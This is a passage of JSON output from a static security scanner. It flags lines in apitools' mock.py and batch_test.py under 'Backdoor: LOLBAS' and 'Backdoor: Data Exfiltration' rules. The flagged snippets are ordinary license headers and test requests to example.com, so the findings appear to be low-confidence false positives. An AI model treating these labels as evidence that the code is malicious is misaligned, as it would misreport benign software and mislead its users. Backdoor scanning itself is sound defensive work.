            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 31,
                  "endLine": 136,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n        if response and exception:\n            raise exceptions.ConfigurationValueError(\n                'Should specify at most one of response and exception')\n        if response and isinstance(response, exceptions.Error):\n            raise exceptions.ConfigurationValueError(\n                'Responses should not be an instance of Error')\n",
                    "rendered": {
                      "text": "\n        if response and exception:\n            raise exceptions.ConfigurationValueError(\n                'Should specify at most one of response and exception')\n        if response and isinstance(response, exceptions.Error):\n            raise exceptions.ConfigurationValueError(\n                'Responses should not be an instance of Error')\n",
                      "markdown": "`\n        if response and exception:\n            raise exceptions.ConfigurationValueError(\n                'Should specify at most one of response and exception')\n        if response and isinstance(response, exceptions.Error):\n            raise exceptions.ConfigurationValueError(\n                'Responses should not be an instance of Error')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock.py"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 50,
                  "endLine": 263,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        # pylint: enable=protected-access\n\n    def __call__(self, request, **unused_kwargs):\n        # TODO(jasmuth): allow the testing code to expect certain\n        # values in these currently unused_kwargs, especially the\n        # upload parameter used by media-heavy services like bigquery\n        # or bigstore.\n",
                    "rendered": {
                      "text": "        # pylint: enable=protected-access\n\n    def __call__(self, request, **unused_kwargs):\n        # TODO(jasmuth): allow the testing code to expect certain\n        # values in these currently unused_kwargs, especially the\n        # upload parameter used by media-heavy services like bigquery\n        # or bigstore.\n",
                      "markdown": "`        # pylint: enable=protected-access\n\n    def __call__(self, request, **unused_kwargs):\n        # TODO(jasmuth): allow the testing code to expect certain\n        # values in these currently unused_kwargs, especially the\n        # upload parameter used by media-heavy services like bigquery\n        # or bigstore.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock.py"
                },
                "region": {
                  "startLine": 187,
                  "startColumn": 19,
                  "endLine": 187,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\nclass _MockedMethod(object):\n\n    \"\"\"A mocked API service method.\"\"\"\n\n    def __init__(self, key, mocked_client, real_method):\n        self.__name__ = real_method.__name__\n",
                    "rendered": {
                      "text": "\nclass _MockedMethod(object):\n\n    \"\"\"A mocked API service method.\"\"\"\n\n    def __init__(self, key, mocked_client, real_method):\n        self.__name__ = real_method.__name__\n",
                      "markdown": "`\nclass _MockedMethod(object):\n\n    \"\"\"A mocked API service method.\"\"\"\n\n    def __init__(self, key, mocked_client, real_method):\n        self.__name__ = real_method.__name__\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/testing/mock.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 7,
                  "endLine": 87,
                  "endColumn": 13,
                  "snippet": {
                    "text": "        received_lines = received_repr.splitlines()\n\n        diff_lines = difflib.unified_diff(expected_lines, received_lines)\n        diff = '\\n'.join(diff_lines)\n\n        if expected_key != received_key:\n            msg = '\\n'.join((\n",
                    "rendered": {
                      "text": "        received_lines = received_repr.splitlines()\n\n        diff_lines = difflib.unified_diff(expected_lines, received_lines)\n        diff = '\\n'.join(diff_lines)\n\n        if expected_key != received_key:\n            msg = '\\n'.join((\n",
                      "markdown": "`        received_lines = received_repr.splitlines()\n\n        diff_lines = difflib.unified_diff(expected_lines, received_lines)\n        diff = '\\n'.join(diff_lines)\n\n        if expected_key != received_key:\n            msg = '\\n'.join((\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 28,
                  "endLine": 130,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                content-type: text/plain\n                content-id: <id+0>\n\n                HTTP/1.1 503 SERVICE UNAVAILABLE\n                nope\n                --boundary--\"\"\"), None))\n\n",
                    "rendered": {
                      "text": "                content-type: text/plain\n                content-id: <id+0>\n\n                HTTP/1.1 503 SERVICE UNAVAILABLE\n                nope\n                --boundary--\"\"\"), None))\n\n",
                      "markdown": "`                content-type: text/plain\n                content-id: <id+0>\n\n                HTTP/1.1 503 SERVICE UNAVAILABLE\n                nope\n                --boundary--\"\"\"), None))\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 8,
                  "endLine": 54,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\nclass FakeService(object):\n\n    \"\"\"A service for testing.\"\"\"\n\n    def GetMethodConfig(self, _):\n        return {}\n",
                    "rendered": {
                      "text": "\nclass FakeService(object):\n\n    \"\"\"A service for testing.\"\"\"\n\n    def GetMethodConfig(self, _):\n        return {}\n",
                      "markdown": "`\nclass FakeService(object):\n\n    \"\"\"A service for testing.\"\"\"\n\n    def GetMethodConfig(self, _):\n        return {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 609,
                  "startColumn": 32,
                  "endLine": 609,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n            test_request = {\n                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n            }\n\n            batch_request = batch.BatchHttpRequest('https://www.example.com',\n",
                    "rendered": {
                      "text": "\n            test_request = {\n                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n            }\n\n            batch_request = batch.BatchHttpRequest('https://www.example.com',\n",
                      "markdown": "`\n            test_request = {\n                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n            }\n\n            batch_request = batch.BatchHttpRequest('https://www.example.com',\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 590,
                  "startColumn": 28,
                  "endLine": 590,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 274,\n                }, 'x' * 274),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 274,\n                }, 'x' * 274),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 274,\n                }, 'x' * 274),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 563,
                  "startColumn": 32,
                  "endLine": 563,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n                '2': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='second'), None, None),\n            }\n\n            batch_request = batch.BatchHttpRequest('https://www.example.com')\n",
                    "rendered": {
                      "text": "                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n                '2': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='second'), None, None),\n            }\n\n            batch_request = batch.BatchHttpRequest('https://www.example.com')\n",
                      "markdown": "`                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n                '2': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='second'), None, None),\n            }\n\n            batch_request = batch.BatchHttpRequest('https://www.example.com')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 561,
                  "startColumn": 32,
                  "endLine": 561,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n            test_requests = {\n                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n                '2': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='second'), None, None),\n            }\n",
                    "rendered": {
                      "text": "\n            test_requests = {\n                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n                '2': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='second'), None, None),\n            }\n",
                      "markdown": "`\n            test_requests = {\n                '1': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='first'), None, None),\n                '2': batch.RequestResponseAndHandler(\n                    http_wrapper.Request(body='second'), None, None),\n            }\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 535,
                  "startColumn": 28,
                  "endLine": 535,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 583,\n                }, 'x' * 583),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 583,\n                }, 'x' * 583),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 583,\n                }, 'x' * 583),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 516,
                  "startColumn": 28,
                  "endLine": 516,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 80,\n                }, 'x' * 80),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 80,\n                }, 'x' * 80),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 80,\n                }, 'x' * 80),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 500,
                  "startColumn": 28,
                  "endLine": 500,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 80,\n                }, 'x' * 80),\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 80,\n                }, 'x' * 80),\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request('https://www.example.com', 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 80,\n                }, 'x' * 80),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 484,
                  "startColumn": 42,
                  "endLine": 484,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        batch_request = batch.BatchHttpRequest('https://www.example.com')\n\n        for x in range(100):\n            batch_request.Add(http_wrapper.Request(body=str(x)))\n\n        for key in batch_request._BatchHttpRequest__request_response_handlers:\n            value = batch_request._BatchHttpRequest__request_response_handlers[\n",
                    "rendered": {
                      "text": "        batch_request = batch.BatchHttpRequest('https://www.example.com')\n\n        for x in range(100):\n            batch_request.Add(http_wrapper.Request(body=str(x)))\n\n        for key in batch_request._BatchHttpRequest__request_response_handlers:\n            value = batch_request._BatchHttpRequest__request_response_handlers[\n",
                      "markdown": "`        batch_request = batch.BatchHttpRequest('https://www.example.com')\n\n        for x in range(100):\n            batch_request.Add(http_wrapper.Request(body=str(x)))\n\n        for key in batch_request._BatchHttpRequest__request_response_handlers:\n            value = batch_request._BatchHttpRequest__request_response_handlers[\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 431,
                  "startColumn": 30,
                  "endLine": 431,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                         batch_request._SerializeRequest(request))\n\n    def testSerializeRequestWithPathAndQueryParams(self):\n        request = http_wrapper.Request(\n            url='my/path?query=param',\n            body='Hello World',\n            headers={'content-type': 'protocol/version'})\n",
                    "rendered": {
                      "text": "                         batch_request._SerializeRequest(request))\n\n    def testSerializeRequestWithPathAndQueryParams(self):\n        request = http_wrapper.Request(\n            url='my/path?query=param',\n            body='Hello World',\n            headers={'content-type': 'protocol/version'})\n",
                      "markdown": "`                         batch_request._SerializeRequest(request))\n\n    def testSerializeRequestWithPathAndQueryParams(self):\n        request = http_wrapper.Request(\n            url='my/path?query=param',\n            body='Hello World',\n            headers={'content-type': 'protocol/version'})\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 415,
                  "startColumn": 30,
                  "endLine": 415,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            'key: value\\n' in batch_request._SerializeRequest(request))\n\n    def testSerializeRequestNoBody(self):\n        request = http_wrapper.Request(body=None, headers={\n            'content-type': 'protocol/version',\n        })\n        expected_serialized_request = '\\n'.join([\n",
                    "rendered": {
                      "text": "            'key: value\\n' in batch_request._SerializeRequest(request))\n\n    def testSerializeRequestNoBody(self):\n        request = http_wrapper.Request(body=None, headers={\n            'content-type': 'protocol/version',\n        })\n        expected_serialized_request = '\\n'.join([\n",
                      "markdown": "`            'key: value\\n' in batch_request._SerializeRequest(request))\n\n    def testSerializeRequestNoBody(self):\n        request = http_wrapper.Request(body=None, headers={\n            'content-type': 'protocol/version',\n        })\n        expected_serialized_request = '\\n'.join([\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 406,
                  "startColumn": 30,
                  "endLine": 406,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        # that it is successfully serialized to the request. Merely\n        # check that it is included, because the order of the headers\n        # in the request is arbitrary.\n        request = http_wrapper.Request(body='Hello World', headers={\n            'content-type': 'protocol/version',\n            'key': 'value',\n        })\n",
                    "rendered": {
                      "text": "        # that it is successfully serialized to the request. Merely\n        # check that it is included, because the order of the headers\n        # in the request is arbitrary.\n        request = http_wrapper.Request(body='Hello World', headers={\n            'content-type': 'protocol/version',\n            'key': 'value',\n        })\n",
                      "markdown": "`        # that it is successfully serialized to the request. Merely\n        # check that it is included, because the order of the headers\n        # in the request is arbitrary.\n        request = http_wrapper.Request(body='Hello World', headers={\n            'content-type': 'protocol/version',\n            'key': 'value',\n        })\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 30,
                  "endLine": 385,
                  "endColumn": 39,
                  "snippet": {
                    "text": "        self._DoTestConvertInvalidHeaderToId('<HEADER>')\n\n    def testSerializeRequest(self):\n        request = http_wrapper.Request(body='Hello World', headers={\n            'content-type': 'protocol/version',\n        })\n        expected_serialized_request = '\\n'.join([\n",
                    "rendered": {
                      "text": "        self._DoTestConvertInvalidHeaderToId('<HEADER>')\n\n    def testSerializeRequest(self):\n        request = http_wrapper.Request(body='Hello World', headers={\n            'content-type': 'protocol/version',\n        })\n        expected_serialized_request = '\\n'.join([\n",
                      "markdown": "`        self._DoTestConvertInvalidHeaderToId('<HEADER>')\n\n    def testSerializeRequest(self):\n        request = http_wrapper.Request(body='Hello World', headers={\n            'content-type': 'protocol/version',\n        })\n        expected_serialized_request = '\\n'.join([\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 43,
                  "endLine": 340,
                  "endColumn": 52,
                  "snippet": {
                    "text": "        desired_url = 'https://www.example.com'\n        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        batch_api_request.Add(FakeService(), 'unused', None, {\n            'desired_request': http_wrapper.Request(desired_url, 'POST', {\n                'content-type': 'multipart/mixed; boundary=\"None\"',\n                'content-length': 80,\n            }, 'x' * 80),\n",
                    "rendered": {
                      "text": "        desired_url = 'https://www.example.com'\n        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        batch_api_request.Add(FakeService(), 'unused', None, {\n            'desired_request': http_wrapper.Request(desired_url, 'POST', {\n                'content-type': 'multipart/mixed; boundary=\"None\"',\n                'content-length': 80,\n            }, 'x' * 80),\n",
                      "markdown": "`        desired_url = 'https://www.example.com'\n        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        batch_api_request.Add(FakeService(), 'unused', None, {\n            'desired_request': http_wrapper.Request(desired_url, 'POST', {\n                'content-type': 'multipart/mixed; boundary=\"None\"',\n                'content-length': 80,\n            }, 'x' * 80),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 288,
                  "startColumn": 28,
                  "endLine": 288,
                  "endColumn": 37,
                  "snippet": {
                    "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419), [\n",
                    "rendered": {
                      "text": "                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419), [\n",
                      "markdown": "`                               autospec=True) as mock_request:\n            self.__ConfigureMock(\n                mock_request,\n                http_wrapper.Request(desired_url, 'POST', {\n                    'content-type': 'multipart/mixed; boundary=\"None\"',\n                    'content-length': 419,\n                }, 'x' * 419), [\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/base/py/batch_test.py"
                },
                "region": {
                  "startLine": 279,
                  "startColumn": 38,
                  "endLine": 279,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n",
                    "rendered": {
                      "text": "        batch_api_request = batch.BatchApiRequest(batch_url=desired_url)\n        # The request to be added. The actual request sent will be somewhat\n        # larger, as this is added to a batch.\n        desired_request = http_wrapper.Request(desired_url, 'POST', {\n            'content-type': 'multipart/mixed; boundary=\"None\"',\n            'content-length': 80,\n        }, 'x' * 80)\n",
